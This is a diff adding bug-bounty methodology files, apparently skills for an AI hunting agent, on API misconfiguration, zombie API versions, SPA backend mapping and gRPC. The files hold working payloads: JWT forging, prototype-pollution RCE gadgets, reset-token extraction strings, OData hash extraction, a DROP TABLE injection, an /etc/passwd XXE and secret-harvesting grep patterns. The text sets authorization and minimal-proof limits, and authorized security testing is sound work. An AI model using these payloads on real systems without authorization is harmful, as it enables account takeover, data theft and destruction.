@@ -2056,3 +2056,1110 @@ curl -X POST https://target.com/graphql \
 | GraphQL introspection disabled | Use clairvoyance for schema reconstruction |
 | Rate limited | Use IP rotation or batch requests |
 | Can't find endpoints | Check Swagger, archive.org, JS files |
+
+
+---
+
+## api-misconfig
+
+## 12. API SECURITY MISCONFIGURATION
+
+### Mass Assignment
+```javascript
+User.update(req.body)  // body has {"role": "admin"} → privilege escalation
+```
+
+### JWT None Algorithm
+```python
+header = {"alg": "none", "typ": "JWT"}
+payload = {"sub": 1, "role": "admin"}
+token = base64(header) + "." + base64(payload) + "."  # no signature
+```
+
+### JWT RS256 → HS256 Algorithm Confusion
+```python
+# Get server's public key from /.well-known/jwks.json
+# Sign token with public key as HMAC secret
+token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
+# Server uses RS256 key as HS256 secret → accepts it
+```
+
+### Prototype Pollution
+```javascript
+// Server-side — Node.js merge without protection
+{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
+```
+
+For server-side prototype pollution, hunt for an object merge primitive first, then a sink. Favor
+JSON/object update endpoints such as profile, address, preferences, settings, cart, admin job, import,
+or webhook configuration. Do not stop at a 200 response to `__proto__`; prove that polluted prototype
+state reaches a later operation.
+
+Hunt sequence:
+
+1. **Find an object-update endpoint.** Prefer endpoints that accept many named fields or JSON objects.
+   Try both JSON and form encodings when the app accepts forms. Include CSRF/session fields when needed.
+2. **Pollute harmless marker properties.** Send variants such as:
+
+```
+{"__proto__":{"polluted":"pp-1337"}}
+{"constructor":{"prototype":{"polluted":"pp-1337"}}}
+__proto__[polluted]=pp-1337
+constructor[prototype][polluted]=pp-1337
+```
+
+3. **Trigger a separate sink.** After pollution, request account/profile/admin/job/export/search/render
+   endpoints and compare with baseline. Strong signals include changed JSON defaults, unexpected fields,
+   server errors mentioning object properties, changed job output, template/render errors, or command/job
+   behavior changes.
+4. **Escalate only through learned sinks.** Candidate properties depend on the sink:
+
+```
+{"__proto__":{"json spaces":10}}
+{"__proto__":{"status":555}}
+{"__proto__":{"isAdmin":true,"role":"admin"}}
+{"__proto__":{"shell":"/bin/bash","argv0":"node","NODE_OPTIONS":"--inspect"}}
+{"__proto__":{"execArgv":["--eval","process.mainModule.require('child_process').execSync('id')"]}}
+```
+
+5. **For exfiltration labs or real impact, prefer non-destructive proof.** If an admin job, diagnostic,
+   export, or rendering endpoint consumes polluted defaults, use a marker or environment/secret read only
+   when authorized. In production, stop at a controlled marker unless scope explicitly permits data access.
+
+### Server-Side Parameter Pollution in Backend URL / REST URL Construction
+
+Use this when a frontend form or endpoint appears to call a server-side API on your behalf
+(password reset, account lookup, profile fetch, product lookup, stock check, search). The bug is not
+ordinary client-side query pollution. The server takes your input and interpolates it into a backend
+URL path or query string, such as:
+
+```
+/api/internal/users/<username>/field/email
+/api/users/<id>
+/api/users?username=<username>&field=email
+```
+
+Hunt sequence:
+
+1. **Find the flow and read the client request.** Fetch the page and any referenced JavaScript. Look
+   for form actions, `fetch(...)`, hidden CSRF fields, and the exact parameter name the browser sends.
+   If there is a reset/account form, test known usernames first to learn the normal success/error shape.
+2. **Determine whether input lands in a backend path or query.** Send URL metacharacters in the input:
+   `#`, `?`, `&x=y`, `/`, `../`, and encoded forms `%23`, `%3f`, `%26x=y`, `%2f`, `%2e%2e%2f`.
+   Distinct errors such as `Invalid route`, `API definition`, `unsupported field`, or changed returned
+   fields mean your value is being interpreted by a server-side URL router, not merely validated as text.
+3. **Use path traversal to move inside the server-side URL.** If `username/../other-user` changes the
+   referenced account, the input is in a REST path segment. Then try appending route fragments such as
+   `/field/email`, `/field/id`, `/field/username`, `/field/passwordResetToken`, and terminate the rest
+   of the original backend path with `#` or `%23` when the backend URL parser honors fragments.
+4. **Discover API documentation from errors.** When an error says to consult the API definition, probe
+   common documentation/spec paths: `/openapi.json`, `/swagger.json`, `/api-docs`, `/api/swagger.json`,
+   `/swagger/v1/swagger.json`, `/v3/api-docs`, and path-traversal variants that attempt to reach the
+   spec from the vulnerable backend route. A spec or descriptive route error tells you valid resources
+   and field names.
+5. **Exploit only to prove impact.** For password reset/account lookup flows, the strongest proof is a
+   sensitive field such as a reset token or secret for another user, then using that token in the normal
+   application flow to complete account takeover. Do not stop at `Invalid route`; use errors as routing
+   feedback.
+
+Payload patterns to try, adapted to the observed parameter name:
+
+```
+username=administrator%23
+username=administrator%3f
+username=administrator%2f..%2fvictimuser
+username=administrator/../victimuser
+username=administrator/field/email%23
+username=administrator/field/id%23
+username=administrator/field/passwordResetToken%23
+username=administrator%2ffield%2fpasswordResetToken%23
+```
+
+### CORS Exploitation
+```bash
+# Test: reflected origin + credentials
+curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
+# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
+# → CRITICAL: attacker reads credentialed responses
+```
+
+---
+
+## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)
+
+OData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.
+
+### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`
+
+```
+GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
+GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
+```
+
+Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))
+
+### Attack class 2 — `$orderby` / `$select` column-disclosure bypass
+
+```
+GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
+```
+
+`$orderby` accepts column names the user has no `$select` permission for, but the engine still sorts on them — the returned order leaks the protected column. Column-level ACLs are enforced on the projection (`$select`) but NOT on `$orderby` / `$filter` — same protected column, different code path. Second Stratus finding in the same Dynamics 365 disclosure; "more dangerous than the first because it directly returned the data" per Stratus.
+
+### Attack class 3 — `$batch` multipart/mixed → per-request WAF signatures miss sub-operations
+
+```
+POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
+--batch_1
+Content-Type: application/http
+GET Users?$filter=1 eq 1 HTTP/1.1
+--batch_1--
+```
+
+WAFs that scan only the outer request body (or that don't natively parse `multipart/mixed`) skip every inner operation. ModSecurity refused `multipart/mixed` historically ([Issue #3296](https://github.com/owasp-modsecurity/ModSecurity/issues/3296)); F5 added native batch parsing only in Advanced WAF v16.1 ([F5 SAP-Fiori advisory](https://www.f5.com/company/blog/securing-sap-fiori-http-batched-requests-odata-with-f5-advance)). The 2025 WAFFLED paper ([arXiv 2503.10846](https://arxiv.org/html/2503.10846v1)) generalises the parsing-discrepancy bypass class across 5 major WAFs.
+
+### Attack class 4 — Encoded / non-canonical operator → keyword-blacklist bypass
+
+```
+GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201   # URL-encoded $
+GET /api?%2524filter=...                                # double-encoded
+GET /Users(1)/$value                                    # path-segment style
+```
+
+Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `concat`, `replace`) look unlike `SELECT`/`UNION` so SQLi-keyword signatures never fire. WAFs that key on the literal string `$filter` see neither form — but the OData server normalises both before evaluating the predicate. Documented since Kalra Black Hat AD 2012; canonical OData-vs-WAF impedance mismatch. ([OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding))
+
+### Attack class 5 — OData → real SQLi when library passes filter raw
+
+```
+$filter=Name eq 'x'); DROP TABLE Users--'
+```
+
+Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).
+
+### Bonus — `$expand` navigation-property IDOR
+
+```
+GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
+```
+
+Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).
+
+### Detection heuristics
+
+- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
+- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
+- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
+- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.
+
+---
+
+## NSwag / Swagger / OpenAPI Spec Exposure (2024-2026 surface)
+
+NSwag is the Swagger/OpenAPI toolchain for ASP.NET Core. Default routes (`/swagger`, `/swagger/v1/swagger.json`, `/swagger/index.html`) ship enabled in many .NET 6/7/8 projects and developers leave them on in production. The exposed spec discloses every endpoint, HTTP methods, parameter names + types + formats + max-lengths, models, validation rules — a complete attack-map in JSON.
+
+### Default discovery paths (cross-references `web2-recon`)
+
+```
+# NSwag / Swashbuckle (ASP.NET Core)
+/swagger, /swagger/index.html, /swagger/v1/swagger.json, /swagger/v2/swagger.json, /swagger/v3/swagger.json
+/swagger-ui, /swagger-ui/, /swagger-ui.html, /api-docs
+/nswag, /nswag/index.html, /api/swagger, /api/swagger.json, /api/openapi.json
+
+# Generic OpenAPI
+/openapi, /openapi.json, /openapi.yaml, /.well-known/openapi.json
+
+# Java / Spring (Springfox / springdoc)
+/v2/api-docs, /v3/api-docs, /v3/api-docs.yaml, /swagger-resources
+
+# Python (FastAPI / Connexion)
+/docs, /redoc, /openapi.json
+
+# Quarkus
+/q/openapi, /q/swagger-ui
+
+# GraphQL adjacent
+/graphql, /graphiql, /playground, /altair, /voyager
+```
+
+Tools: `kiterunner` natively eats OpenAPI; `sj` (Swagger Jacker), `apidetector`, `XSSwagger`.
+
+### Attack chains
+
+**A. Spec disclosure → mass IDOR / BOLA.** Spec lists every `GET /api/v1/users/{userId}/...`. `jq '.paths | keys' swagger.json` → swap `{userId}` for victim's ID via Autorize/`ffuf -mc 200`. Common case: spec leaks `/api/admin/users/{id}/reset-password` documented but missing `[Authorize(Roles="Admin")]` on the controller — low-priv ATO.
+
+**B. Spec disclosure → mass-assignment payload construction.** `components.schemas.UserUpdateDto` enumerates every model field including `isAdmin`, `emailVerified`, `tenantId`, `role`. Attacker copies the schema verbatim into `PATCH /users/me` and adds the privileged fields. Server's `[FromBody]` binder accepts them when DTOs aren't split into read-vs-write models.
+
+**C. Hidden endpoints.** Specs document `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes that no front-end UI references. Reachable but uncovered by WAF rules and often skipped during auth reviews.
+
+**D. Swagger UI configUrl takeover.** Swagger UI loads its config from `?configUrl=`. If unsanitised, attacker hosts an evil OpenAPI spec, sends victim a link to the *legitimate* Swagger UI with `?configUrl=https://evil/spec.json`. Spec routes point back at the legitimate origin so the victim's "Try It Out" clicks fire same-origin authenticated requests. ([HackerOne #3124103 — U.S. DoD Swagger UI Injection, May 2025](https://hackerone.com/reports/3124103))
+
+### Disclosed cases
+
+- **CVE-2018-25031** — Swagger UI ≤ 4.1.2 spec-injection via URL parameter; affects org.webjars:swagger-ui broadly (embedded in Swashbuckle and NSwag bundles).
+- **Swagger UI DOM XSS (3.14.1 → 3.38.0)** — outdated bundled DOMPurify + remote-spec-load → arbitrary JS in victim browser ([Vidoc Security Lab writeup](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers), [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)). Reported live on PayPal, Atlassian, Microsoft, GitLab, Yahoo.
+- **HackerOne #3124103** — U.S. Department of Defense, Swagger UI Injection (May 2025).
+- **HackerOne #2534300** — Ionity GmbH, HTML injection in Swagger UI.
+- **HackerOne #1656650** — Reflected XSS via Swagger UI `url=` parameter.
+- **CloudSEK threat-intel (2024)** — actors abuse exposed `swagger-ui` to invoke a verified-business WhatsApp send-message endpoint, impersonating the company to its customers. 6,000+ exposed Swagger UI instances on Shodan at time of writing. ([CloudSEK report](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers))
+- **CVE-2023-38337** — `rswag` (Ruby Swagger toolchain) directory traversal — reminder that the spec endpoint is itself an attack surface.
+
+### Detection checklist
+
+1. httpx-probe every path above across the full subdomain set; flag 200 with `Content-Type: application/json` AND body matching `"swagger"` or `"openapi"`.
+2. For every hit: `jq '.paths | keys' swagger.json` → feed to kiterunner / Autorize.
+3. `jq '.components.schemas' swagger.json` → mass-assignment field candidates.
+4. Banner the Swagger UI HTML for version string; map to the CVE-2018-25031 / DOM-XSS table.
+5. Test `?configUrl=` and `?url=` parameter handling on every Swagger UI hit.
+
+---
+
+## Related Skills & Chains
+
+- **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
+- **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
+- **`hunt-rce`** — Prototype pollution gadgets in Node.js dependencies (lodash, mongoose, jQuery) reach `child_process.spawn`. Chain primitive: Prototype pollution (`__proto__.shell=true`) + `hunt-rce` (Node.js gadget chain) → RCE on the API node.
+- **`hunt-subdomain`** — CORS regex with wildcard subdomain trusts a takeoverable host. Chain primitive: CORS allowlist `*.target.com` + subdomain takeover → attacker-controlled origin reads credentialed API responses.
+- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
+- **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.
+
+
+
+
+---
+
+## shadow-api
+
+## OWASP API9 — Improper Inventory Management (Shadow / Zombie APIs)
+
+As an API evolves, old versions and internal/staging routes routinely stay reachable without
+receiving the same security fixes as the current version — because nobody tracks that they
+still exist. The bug is rarely in one endpoint; it's in the **delta** between what an old
+version enforces and what the current version enforces on the same operation.
+
+### When to use
+
+Trigger when:
+- Versioned paths are visible (`/v1/`, `/v2/`, `/api/2023-01-01/`) or `Accept`/`X-API-Version`
+  headers are in play.
+- A changelog, release notes, or deprecation notice references removed/old API behavior.
+- A mobile APK/IPA (via `apk-redteam-pipeline` / `ios-redteam-pipeline`) hardcodes endpoints
+  that look like an older backend version than the current web app calls.
+- Multiple OpenAPI/Swagger specs are discoverable, or `info.version` in one spec implies others
+  exist.
+
+DO NOT use for single-version APIs with no version history — there's nothing to diff; go
+straight to `hunt-api-misconfig` for direct exploitation of the one surface that exists.
+
+---
+
+## Stage 1 — Enumerate the Full Version Surface
+
+```bash
+# Path-based versioning
+for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
+  curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
+done
+
+# Header-based versioning
+curl -s -H "X-API-Version: 1" https://$TARGET/api/users
+curl -s -H "Accept: application/vnd.company.v1+json" https://$TARGET/api/users
+
+# Subdomain-based versioning
+for sub in api api-v1 api-v2 apiv1 apiv2 legacy-api old-api internal-api staging-api; do
+  curl -s -o /dev/null -w "%{http_code} $sub\n" "https://$sub.$TARGET/"
+done
+```
+
+A `200`/`401`/`403` on an old version path (anything but `404`/connection-refused) means the
+version is still live and worth carrying into Stage 3, even if it demands auth.
+
+---
+
+## Stage 2 — Pull Every Reachable Spec, Not Just the Linked One
+
+```bash
+for path in openapi.json swagger.json v1/swagger.json v2/swagger.json v3/api-docs \
+            api-docs.json swagger/v1/swagger.json .well-known/openapi.json; do
+  curl -s -o /dev/null -w "%{http_code} /$path\n" "https://$TARGET/$path"
+done
+
+# Wayback Machine — a DEPRECATED version's spec often stays indexed after the live link is removed
+curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET/*swagger*&output=json&collapse=urlkey"
+curl -s "http://web.archive.org/cdx/search/cdx?url=$TARGET/*openapi*&output=json&collapse=urlkey"
+```
+
+When more than one spec resolves (a current one and an archived/old one), diff the endpoint
+inventories directly:
+```bash
+jq -r '.paths | keys[]' v1-swagger.json | sort > /tmp/v1_paths.txt
+jq -r '.paths | keys[]' v2-swagger.json | sort > /tmp/v2_paths.txt
+comm -23 /tmp/v1_paths.txt /tmp/v2_paths.txt   # in v1 only — candidates for "still live but forgotten"
+```
+For every path in that diff, confirm it's still reachable against the v1 base URL. A route
+documented only in the old spec that still returns something other than `404` is a zombie-
+endpoint candidate — carry it into Stage 3.
+
+---
+
+## Stage 3 — Behavioral Diff Between Old and Current Version
+
+For each operation that exists in **both** versions, compare security-relevant behavior, not
+response shape. Response shape differences are Informational; behavioral security regressions
+are the finding.
+
+- **Auth strength.** Does the old version accept no token, an expired token, or a lower-
+  privilege token that the current version rejects?
+  ```bash
+  curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://$TARGET/api/v1/users/me -w '\n%{http_code}\n'
+  curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" https://$TARGET/api/v2/users/me -w '\n%{http_code}\n'
+  ```
+- **Rate limiting.** Burst the same number of requests against both versions' equivalent
+  endpoint; a missing `429` on the old version means rate-limiting was added later and never
+  backported.
+- **Input validation.** Send the identical injection/oversized/malformed payload to both; the
+  old version accepting what the new one rejects means hardening happened forward-only —
+  chain into whichever injection class the payload targets (`hunt-sqli`, `hunt-idor`, etc.).
+- **Field exposure.** Does the old version's response body include fields — internal IDs, other
+  users' data, internal notes, PII — that the current version has since redacted?
+
+---
+
+## Stage 4 — Deprecated / Internal Routes Never Referenced by the Current UI
+
+- Grep JS bundles for API calls no visible UI flow triggers (`/internal/`, `/admin/`, `/debug/`,
+  `/_internal/`, `/test/`, `/staging/`) — reuse `hunt-source-leak`'s JS-bundle grep patterns for
+  this specifically.
+- Check `robots.txt` / `sitemap.xml` for disallowed API paths — a self-inflicted disclosure.
+- Mobile-app endpoint inventories (via `apk-redteam-pipeline` / `ios-redteam-pipeline`) very
+  often reference an older backend version than the current web app calls. Treat every
+  APK/IPA-sourced endpoint as a version-diff candidate against the live web API.
+
+---
+
+## False-Positive Gate
+
+- A version difference alone (different response shape, cosmetic field renaming) is
+  Informational. The finding is a **security-relevant regression** — auth, rate-limit, or
+  validation that got weaker going backward in version history.
+- Confirm the old endpoint is not simply an alias/proxy to the current implementation before
+  claiming a behavioral difference — send a payload that would actually behave differently
+  under old vs. new logic, not just compare a version string in the response body.
+- A `200` on a path that just serves a static "this API version is deprecated, use v2" message
+  is not a finding — confirm the underlying operation still executes.
+
+---
+
+## Severity Table
+
+| Finding | Severity |
+|---|---|
+| Old version bypasses auth entirely where current version requires it | Critical |
+| Old version missing rate-limit present on current version | Medium–High (chain via `hunt-brute-force`) |
+| Old version leaks extra fields (PII, internal IDs) vs. current | Medium–High |
+| Old version accepts payloads the current version now validates/sanitizes | High (chain to the underlying injection class) |
+| Version is reachable but behaviorally identical to current | Informational |
+
+---
+
+## Related Skills & Chains
+
+- **`hunt-api-misconfig`** — owns exploitation once a spec or endpoint is in hand (mass
+  assignment, JWT attacks, OData, Swagger-chain attacks). This skill hands it a sharper target:
+  "here's a zombie endpoint with weaker validation than the current one."
+- **`hunt-subdomain`** — owns host/subdomain-level discovery (`api-v1.target.com` as its own
+  host, potential takeover). This skill owns what happens once you're inside a given host's
+  version surface.
+- **`hunt-source-leak`** — JS-bundle grep for internal/undocumented calls; reused here
+  specifically for version-diffing rather than secret extraction.
+- **`apk-redteam-pipeline`** / **`ios-redteam-pipeline`** — mobile builds routinely hardcode an
+  older API version; every mobile-sourced endpoint is a version-diff candidate.
+- **`hunt-brute-force`** — a rate-limit regression found here is only a complete finding once
+  chained to actual brute-forceable impact (login, OTP, enumeration).
+
+
+
+
+---
+
+## spa-api
+
+## When to use this skill
+
+Trigger when:
+- A target host returns a tiny HTML shell + big `/static/js/*.js` or `/_next/static/*` bundles (React/Vue/Angular/Next/Svelte SPA)
+- You see a subdomain named `console`, `app`, `dashboard`, `portal`, `admin`, `panel`, `manage`, `internal`
+- Recon surfaces any `*api*`, `*-api*`, `api.*` host
+- A login page is OAuth/SSO-gated (the *frontend* auth tells you nothing about whether the *API* enforces auth)
+
+The core insight: **a SPA is a client to a backend API, and it ships the full map of that API — hosts, routes, sometimes keys — to anyone who views source.** The login page being protected says nothing about whether the API behind it checks tokens. Auth is frequently enforced on the *gateway/login* and missing on a *route group* of the API.
+
+DO NOT skip this because "the app needs login" — that's exactly when this pays off.
+
+---
+
+## The play (5 steps)
+
+### 1. Pull the shell + enumerate the bundles
+```bash
+curl -s https://console.target.com/ -o index.html
+# React/CRA:
+grep -oE '/static/js/[^"]+\.js' index.html
+# Next.js:
+grep -oE '/_next/static/[^"]+\.js' index.html
+# generic:
+grep -oiE 'src="[^"]+\.js[^"]*"' index.html
+```
+Download every bundle (they can be multi-MB — that's fine, it's all route data):
+```bash
+mkdir bundles
+for j in $(grep -oE '/static/js/[^"]+\.js' index.html | sort -u); do
+  curl -s "https://console.target.com$j" -o "bundles/$(echo "$j"|tr '/' '_')"
+done
+```
+
+### 2. Harvest API hosts, routes, and secrets from the bundles
+```bash
+B=bundles/*.js
+# Backend API hosts (incl. dev/beta/staging variants — often weaker auth)
+grep -ohiE 'https://[a-z0-9.-]*(api|console|backend|service)[a-z0-9.-]*\.target\.com[a-z0-9/_-]*' $B | sort -u
+# Versioned API base paths
+grep -ohiE '/api/v[0-9]+/?' $B | sort -u
+# Route literals — minified bundles store routes as STRING segments, not full URLs.
+# Grep for quoted "resource/action" strings:
+grep -ohiE '"[a-z0-9_-]+/[a-z0-9_/-]+"' $B | tr -d '"' \
+  | grep -iE '(login|user|account|order|billing|invoice|payment|deal|report|token|otp|password|reset|admin|profile|auth|upload|export|role|permission|dashboard|wallet|finance|sales)' | sort -u
+# Secrets (validate before trusting — most AIza keys are Maps/analytics, not Auth)
+grep -ohiE '(AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_live_[0-9A-Za-z]+|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|apiKey["'"'"']?\s*[:=]\s*["'"'"'][^"'"'"']+)' $B | sort -u
+```
+**Note:** minifiers store routes as concatenated string segments (e.g. `"account/payment/list"`), NOT full `/api/v2/...` URLs — so a naive `/api/v*` grep returns nothing. Grep for the **resource-word route strings** and prepend the base yourself.
+
+**Lazy-loaded (async) chunks — don't stop at HTML-referenced bundles.** CRA/webpack SPAs reference only runtime+main+vendor in index.html; numbered async route chunks are named inside main.js's chunk map and loaded at runtime, so grepping only `/static/js/*.js` from the shell truncates route coverage to eager chunks.
+```bash
+grep -oE '[0-9]+:"[a-f0-9]+"' bundles/*main*.js        # {chunkId:"hash"} pairs
+# reconstruct /static/js/<id>.<hash>.chunk.js, download each, re-run route/host/secret harvest
+# asset-manifest.json (if present) lists them all -> hunt-source-leak
+```
+
+### 3. Establish a CONTROL — find an endpoint that IS gated
+Before declaring anything vulnerable, send an unauthenticated request to an endpoint you expect to be protected, and capture what *correct* rejection looks like:
+```bash
+curl -s -X POST https://api.target.com/api/users -H 'Content-Type: application/json' -d '{}'
+# secure → {"error":"Missing or invalid authorization header"} or HTTP 401
+```
+This is your differential. A sibling API (e.g. a second API host, or a different route group on the same host) is the ideal control — same stack, so a different response = real authz gap, not a quirk.
+
+### 4. Test each route family UNAUTHENTICATED, both methods
+For every discovered route, send it with **no `Authorization` header** and compare to the control:
+```bash
+for r in <routes>; do
+  curl -s -o /tmp/r -w "[%{http_code}] $r\n" -X POST -H 'Content-Type: application/json' -d '{}' "https://api.target.com/api/v2/$r"
+done
+```
+Interpret:
+- **`401`/`"Missing authorization"`** → gated (correct). Move on.
+- **`200` with data** → unauthenticated data exposure. **Finding.**
+- **`400 "field X is mandatory"`** → the route processed your request and reached *business-logic validation* without an auth check → **auth bypass; supply the field minimally to confirm.**
+- **`200` + verbose DB/stack error** (e.g. `PROCEDURE db_x.sp_y does not exist`) → reached the data layer unauthenticated; also a SQLi-surface signal.
+- **Mandatory fields named like `is_admin` / `is_internal` / `requested_by` / `role_id` / `account_type`** → **authorization derived from client-supplied parameters** — set the privilege flag and you self-elevate. Critical-class.
+
+### 5. Pivot & prove (minimally)
+- IDs returned by one endpoint (`account_id`, `order_id`, `deal_id`) are the keys the *other* endpoints consume — they prove the whole router is reachable, not just one route.
+- Test `dev-`/`beta-`/`staging-` API variants — they frequently have weaker/disabled auth.
+- Check the response headers: `Access-Control-Allow-Origin: *` compounds the issue (any web origin reads it from a victim's browser).
+- **STOP at minimum-necessary proof.** A handful of records (or a `totalCount`) confirms the missing check. Do NOT enumerate the table — see `redteam-mindset` data-minimization boundary. The finding is the absent auth, not the data volume.
+
+---
+
+## What "the API behind the SSO login" really means
+
+A common, dangerous architecture:
+- `console.target.com` (the SPA) → login is **Entra/Okta/Google OAuth** (looks airtight).
+- `api.target.com` (the backend) → some route groups enforce the bearer token, **some route groups forgot the middleware.**
+
+The frontend login is theatre if the API doesn't independently validate the token on every route. Always test the API directly, bare, regardless of how locked-down the login UI is.
+
+---
+
+## Anti-patterns
+
+- **"The app requires login, so the API must be protected."** No — test the API directly, unauthenticated. The whole point.
+- **"Minified bundle, can't read it."** You don't need to read it — grep it for hosts/routes/secrets. 5 minutes.
+- **"`/api/v1/foo` returned 404, so no API here."** Wrong base or wrong method. Try `/api/`, `/api/v2/`, POST not GET, and the exact route strings from the bundle (Express's 404 echoes the path — use it to calibrate).
+- **"AIza key found → critical secret."** Validate first — most are Maps/analytics keys (`CONFIGURATION_NOT_FOUND` on identitytoolkit = not Auth-enabled). Don't over-claim.
+- **Dumping the whole dataset once you get a 200.** Stop at PoC. (`redteam-mindset`.)
+- **Account-creation / write endpoints as "proof".** Read endpoints prove the auth gap without creating state. Never POST a `create`/`signup`/`upload` to "demonstrate" — that's a destructive write needing explicit per-action authorization.
+
+---
+
+## Related Skills & Chains
+
+- **`hunt-api-misconfig`** — once the API is mapped, run the broader misconfig matrix (method tampering, mass assignment, JWT alg confusion) per route.
+- **`hunt-idor`** — the `account_id`/`order_id` pivots feed straight into IDOR testing across discovered routes.
+- **`hunt-source-leak`** — sourcemaps (`*.js.map`) reconstruct original source for deeper route/secret extraction; same harvesting muscle.
+- **`hunt-nextjs`** — for Next.js targets, layer the middleware-bypass (`x-middleware-subrequest`) and `/_next/data` route tests on top of this.
+- **`redteam-mindset`** — the data-minimization boundary governs step 5: prove the missing check, don't exfiltrate the table.
+- **`recon-scope-triage`** — verify the API host actually belongs to the target before testing (don't pop a same-named third party's API).
+
+
+
+
+---
+
+## grpc
+
+# HUNT-GRPC — gRPC Security
+
+## Crown Jewel Targets
+
+gRPC reflection enabled = full service catalog enumeration without source code. The highest-value gRPC bugs come from the architectural assumption that a service is "internal" — auth is enforced at the edge proxy, and the backend trusts any caller that reaches it. Once you reach the backend directly (exposed port, SSRF, proxy bypass), that trust collapses.
+
+**Highest-value findings:**
+- **Reflection enabled in production** — `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` lists every method, message, and internal service. Enumeration enabler, not a vuln on its own (see Validation).
+- **Missing auth on internal service** — a service designed for east-west microservice traffic exposed externally with no mTLS and no per-method authorization → call privileged methods directly.
+- **Edge-auth-only / metadata-stripping** — proxy authenticates the user but the backend re-trusts proxy-injected headers (`x-user-id`, `x-tenant-id`, `x-forwarded-*`); if you reach the backend or can inject those headers via the proxy, you impersonate any tenant.
+- **Plaintext gRPC** — gRPC h2c (cleartext HTTP/2) on a non-standard port → credential/metadata interception.
+- **HTTP/2 Rapid Reset DoS (CVE-2023-44487)** — interleaved HEADERS + immediate RST_STREAM frames bypass `MAX_CONCURRENT_STREAMS` accounting → resource exhaustion. **DoS is in scope on almost no program — get explicit written authorization before sending a single burst.**
+
+---
+
+## Phase 1 — Fingerprint & Port Discovery
+
+```bash
+# Common gRPC ports (50051 native; 443/8443 via TLS+ALPN h2; 9090/8080 h2c)
+nmap -sV -p 50051,50052,443,9090,8080,8443,6565,9000 $TARGET 2>/dev/null | grep open
+
+# ALPN must negotiate h2 — gRPC cannot run on HTTP/1.1
+echo | openssl s_client -alpn h2 -connect $TARGET:443 2>/dev/null | grep -i "ALPN.*h2"
+
+# Native-gRPC fingerprint: an HTTP/2 POST to a bogus method returns a grpc-status
+# trailer (12 = UNIMPLEMENTED) even when the path is wrong — strong signal it's gRPC.
